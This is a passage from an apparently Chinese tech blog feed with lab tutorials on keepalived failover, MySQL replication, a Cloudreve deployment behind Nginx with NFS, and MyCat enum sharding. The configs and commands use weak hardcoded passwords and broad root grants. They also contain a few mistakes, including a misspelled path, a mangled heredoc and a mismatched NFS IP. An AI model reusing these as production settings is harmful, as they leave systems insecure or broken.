advert_int 1    interface ens33    authentication {        auth_type PASS        auth_pass 1111    }    virtual_ipaddress {        192.168.110.10/24 dev ens33 label ens33:1    }    track_script {        chk_proxy    }    smtp_alert}EOF# &#x4EE3;&#x7406;&#x68C0;&#x6D4B;&#x811A;&#x672C;cat &gt; /etc/keepaliaved/proxy_check.sh &lt;&lt; EOF#!/bin/bashnetstat -nlpt | grep -w &quot;80&quot; &amp;&gt;&gt; /dev/nullif [ $? -ne 0 ]then    systemctl stop keepalivedfiexit 0EOFchmod +x /etc/keepalived/proxy_check.shsystemctl start keepalivedsystemctl enable keepalived</code></pre><h2 id="&#x914D;&#x7F6E;MySQL"><a href="#&#x914D;&#x7F6E;MySQL" class="headerlink" title="&#x914D;&#x7F6E;MySQL"></a>&#x914D;&#x7F6E;MySQL</h2><pre><code class="shell">#!/bin/bashyum remove -y mariadb-libs# &#x5B89;&#x88C5;MySQLrpm -ivh http://192.168.110.3/other/mysql-community-common-5.7.24-1.el7.x86_64.rpmrpm -ivh http://192.168.110.3/other/mysql-community-libs-5.7.24-1.el7.x86_64.rpmrpm -ivh http://192.168.110.3/other/mysql-community-client-5.7.24-1.el7.x86_64.rpmrpm -ivh http://192.168.110.3/other/mysql-community-server-5.7.24-1.el7.x86_64.rpmrpm -ivh http://192.168.110.3/other/mysql-community-libs-compat-5.7.32-1.el7.x86_64.rpmsystemctl start mysqld#systemctl enable mysqldsystemctl status mysqldecho &quot;skip-name-resolve&quot; &gt;&gt; /etc/my.cnfgrep &quot;temporary password&quot; /var/log/mysqld.log | awk &apos;{ print $NF }&apos;echo &quot;&#x4E0A;&#x9762;&#x662F;MySQL&#x521D;&#x59CB;&#x5BC6;&#x7801;&#xFF0C;&#x8BF7;&#x624B;&#x52A8;&#x4FEE;&#x6539;&#x5BC6;&#x7801;&quot;# mysql_secure_installation# show global variables like &quot;%password%&quot;;# set global validate_password_length=6;# set global validate_password_policy=LOW;# ALTER USER &apos;root&apos;@&apos;localhost&apos; IDENTIFIED BY &apos;ccc.456&apos;;# FLUSH PRIVILEGES;</code></pre><h3 id="&#x914D;&#x7F6E;&#x4E3B;&#x4ECE;"><a href="#&#x914D;&#x7F6E;&#x4E3B;&#x4ECE;" class="headerlink" title="&#x914D;&#x7F6E;&#x4E3B;&#x4ECE;"></a>&#x914D;&#x7F6E;&#x4E3B;&#x4ECE;</h3><pre><code class="shell">#!/bin/bash#mysql_replica.shmysql -uroot -p&quot;ccc.456&quot;GRANT REPLICATION SLAVE ON *.* TO &apos;root&apos;@&apos;192.168.110.%&apos; IDENTIFIED BY &apos;ccc.456&apos;;FLUSH PRIVILEGES;quitcat &gt;&gt; /etc/my.cnf &lt;&lt;EOFserver-id=1log_bin=mysql-binquery_cache_type=OFFbinlog-ignore-db=performance_schemabinlog-ignore-db=mysqlbinlog-ignore-db=sysEOFsystemctl restart mysqld</code></pre><h3 id="MySQL&#x7684;Keepalived&#x9AD8;&#x53EF;&#x7528;"><a href="#MySQL&#x7684;Keepalived&#x9AD8;&#x53EF;&#x7528;" class="headerlink" title="MySQL&#x7684;Keepalived&#x9AD8;&#x53EF;&#x7528;"></a>MySQL&#x7684;Keepalived&#x9AD8;&#x53EF;&#x7528;</h3><pre><code class="shell">echo -e &quot;192.168.110.18\tserver18\n192.168.110.19\tserver19\n&quot; &gt;&gt; /etc/hostsyum install -y keepalivedmv /etc/keepalived/keepalived.conf /etc/keepalived/keepalived.confbak# KeepAlivedcat &gt; /etc/keepalived/keepalived.conf &lt;&lt; EOF! Configuration File for keepalivedglobal_defs {    notification_email {        Jaking@vip.163.com    }    notification_email_from keepalived@server18    smtp_server 127.0.0.1    smtp_connect_timeout 30    router_id server18    vrrp_mcast_group5 225.5.5.5}    vrrp_script chk_proxy {        script &quot;/etc/keepalived/proxy_check.sh&quot;        interval 2        weight -2    }    vrrp_instance VI_1 {    state BACKUP    nopreempt    virtual_router_id 11    priority 100    advert_int 1    interface ens33    authentication {        auth_type PASS        auth_pass 1111    }    virtual_ipaddress {        192.168.110.20/24 dev ens33 label ens33:1    }    track_script {        chk_proxy    }    smtp_alert}EOFcat &gt; /etc/keepalived/proxy_check.sh &lt;&lt;EOFecho &gt; /etc/keepalived/proxy_check.sh &lt;&lt; EOF#!/bin/bashnetstat -nlpt | grep -w &quot;3306&quot; &amp;&gt;&gt; /dev/nullif [ $? -ne 0 ]then    systemctl stop keepalivedfiexit 0EOFchmod a+x /etc/keepalived/proxy_check.shsystemctl restart keepalived</code></pre><h2 id="&#x9879;&#x76EE;&#x4E0A;&#x7EBF;"><a href="#&#x9879;&#x76EE;&#x4E0A;&#x7EBF;" class="headerlink" title="&#x9879;&#x76EE;&#x4E0A;&#x7EBF;"></a>&#x9879;&#x76EE;&#x4E0A;&#x7EBF;</h2><pre><code class="shell">yum install -y unzipunzip Cloudreve_v1.0.3&#x4E91;&#x76D8;.zipssh root@192.168.110.18 &quot;mysql -uroot -p&quot;ccc.456&quot; -e &apos;create database cloud;&apos;&quot;sql_user=&quot;mysql -uroot -p&quot;ccc.456&quot; -e &apos;GRANT ALL ON cloud.* TO &quot;abc&quot;@&quot;192.168.110.%&quot; IDENTIFIED BY &quot;Abc.abc.1&quot;;&apos;&quot;ssh root@192.168.110.18 &quot;$sql_user&quot;chown -R nobody:nobody /webData/chmod u+w /webData/runtime/chmod u+w /webData/public/cp /webData/application/database_sample.php /webData/application/database.php</code></pre><h3 id="&#x4FEE;&#x6539;Nginx&#x4EE3;&#x7406;&#x914D;&#x7F6E;"><a href="#&#x4FEE;&#x6539;Nginx&#x4EE3;&#x7406;&#x914D;&#x7F6E;" class="headerlink" title="&#x4FEE;&#x6539;Nginx&#x4EE3;&#x7406;&#x914D;&#x7F6E;"></a>&#x4FEE;&#x6539;Nginx&#x4EE3;&#x7406;&#x914D;&#x7F6E;</h3><pre><code class="nginx">cat /usr/local/nginx/conf/user/proxy.conf server {    listen       80;    server_name  www.uplookinglinux.com;    charset utf-8;    access_log  /var/log/nginx/proxy.access.log  main;    #################################################    fastcgi_connect_timeout 30;    fastcgi_send_timeout 30;    fastcgi_read_timeout 30;    fastcgi_buffer_size  64k;    fastcgi_buffers 4 64k;    fastcgi_busy_buffers_size 128k;    fastcgi_temp_file_write_size 128k;    #uri &#x5339;&#x914D; .php &#x6216;&#x8005; .php5 &#x7ED3;&#x5C3E;    location ~ \.(php|php5)$ {        root   /var/www/web;        #&#x6307;&#x5B9A;&#x4EE3;&#x7406;&#x5230; phpServer&#x96C6;&#x7FA4;        fastcgi_pass  phpServer;        fastcgi_index index.php;        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;        include   fastcgi_params;    }    #&#x5339;&#x914D;&#x6839;&#x76EE;&#x5F55;&#xFF0C;&#x56E0;&#x4E3A;&#x6839;&#x76EE;&#x5F55;&#x4E0B;&#x7684;&#x4E3B;&#x9875;&#x4E3A;index.php&#x52A8;&#x6001;&#x9875;&#x9762;    location = / {        root   /var/www/web;        #&#x6307;&#x5B9A;&#x4EE3;&#x7406;&#x5230; phpServer&#x96C6;&#x7FA4;        fastcgi_pass  phpServer;        fastcgi_index index.php;        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;        include   fastcgi_params;    }    #################################################    location / {        #&#x8BBE;&#x7F6E;&#x4F2A;&#x9759;&#x6001;&#x8F6C;&#x53D1;&#x89C4;&#x5219;        if (!-e $request_filename) {            rewrite  ^(.*)$  /index.php?s=/$1  last;            break;        }        root   /var/www/web;        index  index.html index.htm;        proxy_pass http://webServer;        proxy_set_header X-Real-IP  $remote_addr;        proxy_set_header X-Forwarded-For   $proxy_add_x_forwarded_for;        proxy_redirect off;        proxy_connect_timeout 30;        proxy_send_timeout 15;        proxy_read_timeout 15;    }}yum install -y nfs-utilsmkdir -p /var/www/webchown nobody:nobody /var/www/web/mount -tnfs 192.168.110.17:/webData /var/www/web/echo -e &quot;192.168.10.17:/webData\t/var/www/web\tnfs\tdefaults\t0 0&quot; &gt;&gt; /etc/fstabmount -a</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;9&amp;#x53F0;&amp;#x673A;&amp;#x5668;IP&amp;#x5730;&amp;#x5740;&amp;#x5206;&amp;#x914D;&amp;#xFF08;&amp;#x9759;&amp;#x6001;&amp;#xFF09;&amp;#xFF1A;&lt;/strong&gt;&amp;#xFF1A;&lt;br&gt;&lt;code&gt;192
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>MyCat教程全国省份分片枚举操作</title>
    <link href="https://marnm.github.io//posts/8f74b0e7/"/>
    <id>https://marnm.github.io//posts/8f74b0e7/</id>
    <published>2022-06-07T04:46:57.000Z</published>
    <updated>2022-06-07T05:10:40.226Z</updated>
    
    <content type="html"><![CDATA[<h1 id="MyCat&#x5206;&#x7247;&#x679A;&#x4E3E;&#x64CD;&#x4F5C;&#x2014;&#x2014;&#x5168;&#x56FD;&#x7701;&#x4EFD;&#x5206;&#x7247;"><a href="#MyCat&#x5206;&#x7247;&#x679A;&#x4E3E;&#x64CD;&#x4F5C;&#x2014;&#x2014;&#x5168;&#x56FD;&#x7701;&#x4EFD;&#x5206;&#x7247;" class="headerlink" title="MyCat&#x5206;&#x7247;&#x679A;&#x4E3E;&#x64CD;&#x4F5C;&#x2014;&#x2014;&#x5168;&#x56FD;&#x7701;&#x4EFD;&#x5206;&#x7247;"></a>MyCat&#x5206;&#x7247;&#x679A;&#x4E3E;&#x64CD;&#x4F5C;&#x2014;&#x2014;&#x5168;&#x56FD;&#x7701;&#x4EFD;&#x5206;&#x7247;</h1><p><strong>&#x673A;&#x5668;</strong></p><table><thead><tr><th>IP</th><th>&#x7CFB;&#x7EDF;</th><th>&#x89D2;&#x8272;</th></tr></thead><tbody><tr><td>192.168.73.20</td><td>CentOS 7.4</td><td>MyCat Server</td></tr><tr><td>192.168.73.21</td><td>RHEL 7.3</td><td>MySQL Server 5.7</td></tr><tr><td>192.168.73.22</td><td>CentOS 7.4</td><td>MySQL Server 5.7</td></tr><tr><td>192.168.73.23</td><td>RHEL 7.3</td><td>MySQL Server 5.7</td></tr></tbody></table><h3 id="&#x521B;&#x5EFA;&#x6570;&#x636E;&#x5E93;"><a href="#&#x521B;&#x5EFA;&#x6570;&#x636E;&#x5E93;" class="headerlink" title="&#x521B;&#x5EFA;&#x6570;&#x636E;&#x5E93;"></a>&#x521B;&#x5EFA;&#x6570;&#x636E;&#x5E93;</h3><p><strong>192.168.73.21</strong></p><pre><code class="sql">drop database jakingtestdb01;drop database jakingtestdb02;drop database jakingtestdb03;create database jakingtestdb01 default character set utf8; create database jakingtestdb02 default character set utf8; create database jakingtestdb03 default character set utf8; create database jakingtestdb04 default character set utf8; create database jakingtestdb05 default character set utf8; create database jakingtestdb06 default character set utf8; create database jakingtestdb07 default character set utf8; create database jakingtestdb08 default character set utf8; create database jakingtestdb09 default character set utf8; create database jakingtestdb10 default character set utf8; create database jakingtestdb11 default character set utf8; create database jakingtestdb12 default character set utf8;show databases;</code></pre><p><strong>192.168.73.22</strong></p><pre><code class="sql">drop database jakingtestdb04;drop database jakingtestdb05;drop database jakingtestdb06;create database jakingtestdb13 default character set utf8; create database jakingtestdb14 default character set utf8; create database jakingtestdb15 default character set utf8; create database jakingtestdb16 default character set utf8; create database jakingtestdb17 default character set utf8; create database jakingtestdb18 default character set utf8; create database jakingtestdb19 default character set utf8; create database jakingtestdb20 default character set utf8; create database jakingtestdb21 default character set utf8; create database jakingtestdb22 default character set utf8; create database jakingtestdb23 default character set utf8; create database jakingtestdb24 default character set utf8;show databases;</code></pre><p><strong>192.168.73.23</strong></p><pre><code class="sql">drop database jakingtestdb07;drop database jakingtestdb08;drop database jakingtestdb09;create database jakingtestdb25 default character set utf8; create database jakingtestdb26 default character set utf8; create database jakingtestdb27 default character set utf8; create database jakingtestdb28 default character set utf8; create database jakingtestdb29 default character set utf8; create database jakingtestdb30 default character set utf8; create database jakingtestdb31 default character set utf8; create database jakingtestdb32 default character set utf8; create database jakingtestdb33 default character set utf8; create database jakingtestdb34 default character set utf8; create database jakingtestdb35 default character set utf8; create database jakingtestdb36 default character set utf8;show databases;</code></pre><h3 id="&#x914D;&#x7F6E;MyCat&#x670D;&#x52A1;"><a href="#&#x914D;&#x7F6E;MyCat&#x670D;&#x52A1;" class="headerlink" title="&#x914D;&#x7F6E;MyCat&#x670D;&#x52A1;"></a>&#x914D;&#x7F6E;MyCat&#x670D;&#x52A1;</h3><p><code>server.xml</code></p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!-- - - Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);        - you may not use this file except in compliance with the License. - You        may obtain a copy of the License at - - http://www.apache.org/licenses/LICENSE-2.0        - - Unless required by applicable law or agreed to in writing, software -        distributed under the License is distributed on an &quot;AS IS&quot; BASIS, - WITHOUT        WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. - See the        License for the specific language governing permissions and - limitations        under the License. --&gt;&lt;!DOCTYPE mycat:server SYSTEM &quot;server.dtd&quot;&gt;&lt;mycat:server xmlns:mycat=&quot;http://io.mycat/&quot;&gt;        &lt;system&gt;        &lt;property name=&quot;nonePasswordLogin&quot;&gt;0&lt;/property&gt; &lt;!-- 0&#x4E3A;&#x9700;&#x8981;&#x5BC6;&#x7801;&#x767B;&#x9646;&#x3001;1&#x4E3A;&#x4E0D;&#x9700;&#x8981;&#x5BC6;&#x7801;&#x767B;&#x9646; ,&#x9ED8;&#x8BA4;&#x4E3A;0&#xFF0C;&#x8BBE;&#x7F6E;&#x4E3A;1&#x5219;&#x9700;&#x8981;&#x6307;&#x5B9A;&#x9ED8;&#x8BA4;&#x8D26;&#x6237;--&gt;        &lt;property name=&quot;useHandshakeV10&quot;&gt;1&lt;/property&gt;        &lt;property name=&quot;useSqlStat&quot;&gt;0&lt;/property&gt;  &lt;!-- 1&#x4E3A;&#x5F00;&#x542F;&#x5B9E;&#x65F6;&#x7EDF;&#x8BA1;&#x3001;0&#x4E3A;&#x5173;&#x95ED; --&gt;        &lt;property name=&quot;useGlobleTableCheck&quot;&gt;0&lt;/property&gt;  &lt;!-- 1&#x4E3A;&#x5F00;&#x542F;&#x5168;&#x52A0;&#x73ED;&#x4E00;&#x81F4;&#x6027;&#x68C0;&#x6D4B;&#x3001;0&#x4E3A;&#x5173;&#x95ED; --&gt;                &lt;property name=&quot;sqlExecuteTimeout&quot;&gt;300&lt;/property&gt;  &lt;!-- SQL &#x6267;&#x884C;&#x8D85;&#x65F6; &#x5355;&#x4F4D;:&#x79D2;--&gt;                &lt;property name=&quot;sequnceHandlerType&quot;&gt;2&lt;/property&gt;                &lt;!--&lt;property name=&quot;sequnceHandlerPattern&quot;&gt;(?:(\s*next\s+value\s+for\s*MYCATSEQ_(\w+))(,|\)|\s)*)+&lt;/property&gt;--&gt;                &lt;!--&#x5FC5;&#x987B;&#x5E26;&#x6709;MYCATSEQ_&#x6216;&#x8005; mycatseq_&#x8FDB;&#x5165;&#x5E8F;&#x5217;&#x5339;&#x914D;&#x6D41;&#x7A0B; &#x6CE8;&#x610F;MYCATSEQ_&#x6709;&#x7A7A;&#x683C;&#x7684;&#x60C5;&#x51B5;--&gt;                &lt;property name=&quot;sequnceHandlerPattern&quot;&gt;(?:(\s*next\s+value\s+for\s*MYCATSEQ_(\w+))(,|\)|\s)*)+&lt;/property&gt;        &lt;property name=&quot;subqueryRelationshipCheck&quot;&gt;false&lt;/property&gt; &lt;!-- &#x5B50;&#x67E5;&#x8BE2;&#x4E2D;&#x5B58;&#x5728;&#x5173;&#x8054;&#x67E5;&#x8BE2;&#x7684;&#x60C5;&#x51B5;&#x4E0B;,&#x68C0;&#x67E5;&#x5173;&#x8054;&#x5B57;&#x6BB5;&#x4E2D;&#x662F;&#x5426;&#x6709;&#x5206;&#x7247;&#x5B57;&#x6BB5; .&#x9ED8;&#x8BA4; false --&gt;      &lt;!--  &lt;property name=&quot;useCompression&quot;&gt;1&lt;/property&gt;--&gt; &lt;!--1&#x4E3A;&#x5F00;&#x542F;mysql&#x538B;&#x7F29;&#x534F;&#x8BAE;--&gt;        &lt;!--  &lt;property name=&quot;fakeMySQLVersion&quot;&gt;5.6.20&lt;/property&gt;--&gt; &lt;!--&#x8BBE;&#x7F6E;&#x6A21;&#x62DF;&#x7684;MySQL&#x7248;&#x672C; &#x53F7;--&gt;        &lt;!-- &lt;property name=&quot;processorBufferChunk&quot;&gt;40960&lt;/property&gt; --&gt;        &lt;!--        &lt;property name=&quot;processors&quot;&gt;1&lt;/property&gt;        &lt;property name=&quot;processorExecutor&quot;&gt;32&lt;/property&gt;         --&gt;        &lt;!--&#x9ED8;&#x8BA4;&#x4E3A;type 0: DirectByteBufferPool | type 1 ByteBufferArena | type 2 NettyBufferPool --&gt;                &lt;property name=&quot;processorBufferPoolType&quot;&gt;0&lt;/property&gt;                &lt;!--&#x9ED8;&#x8BA4;&#x662F;65535 64K &#x7528;&#x4E8E;sql&#x89E3;&#x6790;&#x65F6;&#x6700;&#x5927;&#x6587;&#x672C;&#x957F;&#x5EA6; --&gt;                &lt;!--&lt;property name=&quot;maxStringLiteralLength&quot;&gt;65535&lt;/property&gt;--&gt;                &lt;!--&lt;property name=&quot;sequnceHandlerType&quot;&gt;0&lt;/property&gt;--&gt;                &lt;!--&lt;property name=&quot;backSocketNoDelay&quot;&gt;1&lt;/property&gt;--&gt;                &lt;!--&lt;property name=&quot;frontSocketNoDelay&quot;&gt;1&lt;/property&gt;--&gt;                &lt;!--&lt;property name=&quot;processorExecutor&quot;&gt;16&lt;/property&gt;--&gt;                &lt;!--                        &lt;property name=&quot;serverPort&quot;&gt;8066&lt;/property&gt; &lt;property name=&quot;managerPort&quot;&gt;9066&lt;/property&gt;                        &lt;property name=&quot;idleTimeout&quot;&gt;300000&lt;/property&gt; &lt;property name=&quot;bindIp&quot;&gt;0.0.0.0&lt;/property&gt;                        &lt;property name=&quot;dataNodeIdleCheckPeriod&quot;&gt;300000&lt;/property&gt; 5 * 60 * 1000L; //&#x8FDE;&#x63A5;&#x7A7A;&#x95F2;&#x68C0;&#x67E5;                        &lt;property name=&quot;frontWriteQueueSize&quot;&gt;4096&lt;/property&gt; &lt;property name=&quot;processors&quot;&gt;32&lt;/property&gt; --&gt;                &lt;!--&#x5206;&#x5E03;&#x5F0F;&#x4E8B;&#x52A1;&#x5F00;&#x5173;&#xFF0C;0&#x4E3A;&#x4E0D;&#x8FC7;&#x6EE4;&#x5206;&#x5E03;&#x5F0F;&#x4E8B;&#x52A1;&#xFF0C;1&#x4E3A;&#x8FC7;&#x6EE4;&#x5206;&#x5E03;&#x5F0F;&#x4E8B;&#x52A1;&#xFF08;&#x5982;&#x679C;&#x5206;&#x5E03;&#x5F0F;&#x4E8B;&#x52A1;&#x5185; &#x53EA;&#x6D89;&#x53CA;&#x5168;&#x5C40;&#x8868;&#xFF0C;&#x5219;&#x4E0D;&#x8FC7;&#x6EE4;&#xFF09;&#xFF0C;2&#x4E3A;&#x4E0D;&#x8FC7;&#x6EE4;&#x5206;&#x5E03;&#x5F0F;&#x4E8B;&#x52A1;,&#x4F46;&#x662F;&#x8BB0;&#x5F55;&#x5206;&#x5E03;&#x5F0F;&#x4E8B;&#x52A1;&#x65E5;&#x5FD7;--&gt;                &lt;property name=&quot;handleDistributedTransactions&quot;&gt;0&lt;/property&gt;                        &lt;!--                        off heap for merge/order/group/limit      1&#x5F00;&#x542F;   0&#x5173;&#x95ED;                --&gt;                &lt;property name=&quot;useOffHeapForMerge&quot;&gt;0&lt;/property&gt;                &lt;!--                        &#x5355;&#x4F4D;&#x4E3A;m                --&gt;        &lt;property name=&quot;memoryPageSize&quot;&gt;64k&lt;/property&gt;                &lt;!--                        &#x5355;&#x4F4D;&#x4E3A;k                --&gt;                &lt;property name=&quot;spillsFileBufferSize&quot;&gt;1k&lt;/property&gt;                &lt;property name=&quot;useStreamOutput&quot;&gt;0&lt;/property&gt;                &lt;!--                        &#x5355;&#x4F4D;&#x4E3A;m                --&gt;                &lt;property name=&quot;systemReserveMemorySize&quot;&gt;384m&lt;/property&gt;                &lt;!--&#x662F;&#x5426;&#x91C7;&#x7528;zookeeper&#x534F;&#x8C03;&#x5207;&#x6362;  --&gt;                &lt;property name=&quot;useZKSwitch&quot;&gt;false&lt;/property&gt;                &lt;!-- XA Recovery Log&#x65E5;&#x5FD7;&#x8DEF;&#x5F84; --&gt;                &lt;!--&lt;property name=&quot;XARecoveryLogBaseDir&quot;&gt;./&lt;/property&gt;--&gt;                &lt;!-- XA Recovery Log&#x65E5;&#x5FD7;&#x540D;&#x79F0; --&gt;                &lt;!--&lt;property name=&quot;XARecoveryLogBaseName&quot;&gt;tmlog&lt;/property&gt;--&gt;                &lt;!--&#x5982;&#x679C;&#x4E3A; true&#x7684;&#x8BDD; &#x4E25;&#x683C;&#x9075;&#x5B88;&#x9694;&#x79BB;&#x7EA7;&#x522B;,&#x4E0D;&#x4F1A;&#x5728;&#x4EC5;&#x4EC5;&#x53EA;&#x6709;select&#x8BED;&#x53E5;&#x7684;&#x65F6;&#x5019;&#x5728;&#x4E8B;&#x52A1;&#x4E2D;&#x5207;&#x6362;&#x8FDE;&#x63A5;--&gt;                &lt;property name=&quot;strictTxIsolation&quot;&gt;false&lt;/property&gt;                &lt;property name=&quot;useZKSwitch&quot;&gt;true&lt;/property&gt;        &lt;/system&gt;        &lt;!-- &#x5168;&#x5C40;SQL&#x9632;&#x706B;&#x5899;&#x8BBE;&#x7F6E; --&gt;        &lt;!--&#x767D;&#x540D;&#x5355;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x901A;&#x914D;&#x7B26;%&#x6216;&#x7740;*--&gt;        &lt;!--&#x4F8B;&#x5982;&lt;host host=&quot;127.0.0.*&quot; user=&quot;root&quot;/&gt;--&gt;        &lt;!--&#x4F8B;&#x5982;&lt;host host=&quot;127.0.*&quot; user=&quot;root&quot;/&gt;--&gt;        &lt;!--&#x4F8B;&#x5982;&lt;host host=&quot;127.*&quot; user=&quot;root&quot;/&gt;--&gt;        &lt;!--&#x4F8B;&#x5982;&lt;host host=&quot;1*7.*&quot; user=&quot;root&quot;/&gt;--&gt;        &lt;!--&#x8FD9;&#x4E9B;&#x914D;&#x7F6E;&#x60C5;&#x51B5;&#x4E0B;&#x5BF9;&#x4E8E;127.0.0.1&#x90FD;&#x80FD;&#x4EE5;root&#x8D26;&#x6237;&#x767B;&#x5F55;--&gt;        &lt;!--        &lt;firewall&gt;           &lt;whitehost&gt;              &lt;host host=&quot;1*7.0.0.*&quot; user=&quot;root&quot;/&gt;           &lt;/whitehost&gt;       &lt;blacklist check=&quot;false&quot;&gt;       &lt;/blacklist&gt;        &lt;/firewall&gt;        --&gt;        &lt;user name=&quot;root&quot; defaultAccount=&quot;true&quot;&gt;                &lt;property name=&quot;password&quot;&gt;123456&lt;/property&gt;                &lt;property name=&quot;schemas&quot;&gt;mycatdb&lt;/property&gt;                &lt;!-- &#x8868;&#x7EA7; DML &#x6743;&#x9650;&#x8BBE;&#x7F6E; --&gt;                &lt;!--                &lt;privileges check=&quot;false&quot;&gt;                        &lt;schema name=&quot;TESTDB&quot; dml=&quot;0110&quot; &gt;                                &lt;table name=&quot;tb01&quot; dml=&quot;0000&quot;&gt;&lt;/table&gt;                                &lt;table name=&quot;tb02&quot; dml=&quot;1111&quot;&gt;&lt;/table&gt;                        &lt;/schema&gt;                &lt;/privileges&gt;                 --&gt;        &lt;/user&gt;        &lt;user name=&quot;user&quot;&gt;                &lt;property name=&quot;password&quot;&gt;ccc.456&lt;/property&gt;                &lt;property name=&quot;schemas&quot;&gt;mycatdb&lt;/property&gt;                &lt;property name=&quot;readOnly&quot;&gt;true&lt;/property&gt;        &lt;/user&gt;&lt;/mycat:server&gt;</code></pre><p><code>schema.xml</code></p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE mycat:schema SYSTEM &quot;schema.dtd&quot;&gt;&lt;mycat:schema xmlns:mycat=&quot;http://io.mycat/&quot;&gt;&lt;schema name=&quot;mycatdb&quot; checkSQLschema=&quot;false&quot; sqlMaxLimit=&quot;100&quot;&gt;    &lt;table name=&quot;jaking_member&quot; dataNode=&quot;dnmycatdb$1-35&quot; rule=&quot;sharding-by-intfile-mycatdb-jakingtest_member&quot;&gt;&lt;/table&gt;&lt;/schema&gt;&lt;!-- &#x8BBE;&#x5B9A;&#x6570;&#x636E;&#x7ED3;&#x70B9; dnmycatdb1-dnmycatdb12 &#x5BF9;&#x5E94;&#x7684; 192.168.73.21 &#x670D;&#x52A1; &#x4EE5;&#x53CA;&#x5BF9;&#x5E94;&#x7684;&#x7269;&#x7406; schema --&gt;&lt;dataNode name=&quot;dnmycatdb1&quot; dataHost=&quot;192.168.73.21&quot; database=&quot;jakingtestdb01&quot; /&gt;&lt;dataNode name=&quot;dnmycatdb2&quot; dataHost=&quot;192.168.73.21&quot; database=&quot;jakingtestdb02&quot; /&gt;&lt;dataNode name=&quot;dnmycatdb3&quot; dataHost=&quot;192.168.73.21&quot; database=&quot;jakingtestdb03&quot; /&gt;&lt;dataNode name=&quot;dnmycatdb4&quot; dataHost=&quot;192.168.73.21&quot; database=&quot;jakingtestdb04&quot; /&gt;&lt;dataNode name=&quot;dnmycatdb5&quot; dataHost=&quot;192.168.73.21&quot; database=&quot;jakingtestdb05&quot; /&gt;&lt;dataNode name=&quot;dnmycatdb6&quot; dataHost=&quot;192.168.73.21&quot; database=&quot;jakingtestdb06&quot; /&gt;&lt;dataNode name=&quot;dnmycatdb7&quot; dataHost=&quot;192.168.73.21&quot; database=&quot;jakingtestdb07&quot; /&gt;&lt;dataNode name=&quot;dnmycatdb8&quot; dataHost=&quot;192.168.73.21&quot; database=&quot;jakingtestdb08&quot; /&gt;&lt;dataNode name=&quot;dnmycatdb9&quot; dataHost=&quot;192.168.73.21&quot; database=&quot;jakingtestdb09&quot; /&gt;&lt;dataNode name=&quot;dnmycatdb10&quot; dataHost=&quot;192.168.73.21&quot; database=&quot;jakingtestdb10&quot; /&gt;&lt;dataNode name=&quot;dnmycatdb11&quot; dataHost=&quot;192.168.73.21&quot; database=&quot;jakingtestdb11&quot; /&gt;&lt;dataNode name=&quot;dnmycatdb12&quot; dataHost=&quot;192.168.73.21&quot; database=&quot;jakingtestdb12&quot; /&gt;&lt;!-- &#x8BBE;&#x5B9A;&#x6570;&#x636E;&#x7ED3;&#x70B9; dnmycatdb13-dnmycatdb24 &#x5BF9;&#x5E94;&#x7684; 192.168.73.22 &#x670D;&#x52A1; &#x4EE5;&#x53CA;&#x5BF9;&#x5E94;&#x7684; &#x7269;&#x7406; schema --&gt;&lt;dataNode name=&quot;dnmycatdb13&quot; dataHost=&quot;192.168.73.22&quot; database=&quot;jakingtestdb13&quot; /&gt;&lt;dataNode name=&quot;dnmycatdb14&quot; dataHost=&quot;192.168.73.22&quot; database=&quot;jakingtestdb14&quot; /&gt;&lt;dataNode name=&quot;dnmycatdb15&quot; dataHost=&quot;192.168.73.22&quot; database=&quot;jakingtestdb15&quot; /&gt;&lt;dataNode name=&quot;dnmycatdb16&quot; dataHost=&quot;192.168.73.22&quot; database=&quot;jakingtestdb16&quot; /&gt;&lt;dataNode name=&quot;dnmycatdb17&quot; dataHost=&quot;192.168.73.22&quot; database=&quot;jakingtestdb17&quot; /&gt;&lt;dataNode name=&quot;dnmycatdb18&quot; dataHost=&quot;192.168.73.22&quot; database=&quot;jakingtestdb18&quot; /&gt;&lt;dataNode name=&quot;dnmycatdb19&quot; dataHost=&quot;192.168.73.22&quot; database=&quot;jakingtestdb19&quot; /&gt;&lt;dataNode name=&quot;dnmycatdb20&quot; dataHost=&quot;192.168.73.22&quot; database=&quot;jakingtestdb20&quot; /&gt;&lt;dataNode name=&quot;dnmycatdb21&quot; dataHost=&quot;192.168.73.22&quot; database=&quot;jakingtestdb21&quot; /&gt;&lt;dataNode name=&quot;dnmycatdb22&quot; dataHost=&quot;192.168.73.22&quot; database=&quot;jakingtestdb22&quot; /&gt;&lt;dataNode name=&quot;dnmycatdb23&quot; dataHost=&quot;192.168.73.22&quot; database=&quot;jakingtestdb23&quot; /&gt;&lt;dataNode name=&quot;dnmycatdb24&quot; dataHost=&quot;192.168.73.22&quot; database=&quot;jakingtestdb24&quot; /&gt;&lt;!-- &#x8BBE;&#x5B9A;&#x6570;&#x636E;&#x7ED3;&#x70B9; dnmycatdb25-dnmycatdb35 &#x5BF9;&#x5E94;&#x7684; 192.168.73.23 &#x670D;&#x52A1; &#x4EE5;&#x53CA;&#x5BF9;&#x5E94;&#x7684; &#x7269;&#x7406; schema --&gt;&lt;dataNode name=&quot;dnmycatdb25&quot; dataHost=&quot;192.168.73.23&quot; database=&quot;jakingtestdb25&quot; /&gt;&lt;dataNode name=&quot;dnmycatdb26&quot; dataHost=&quot;192.168.73.23&quot; database=&quot;jakingtestdb26&quot; /&gt;&lt;dataNode name=&quot;dnmycatdb27&quot; dataHost=&quot;192.168.73.23&quot; database=&quot;jakingtestdb27&quot; /&gt;&lt;dataNode name=&quot;dnmycatdb28&quot; dataHost=&quot;192.168.73.23&quot; database=&quot;jakingtestdb28&quot; /&gt;&lt;dataNode name=&quot;dnmycatdb29&quot; 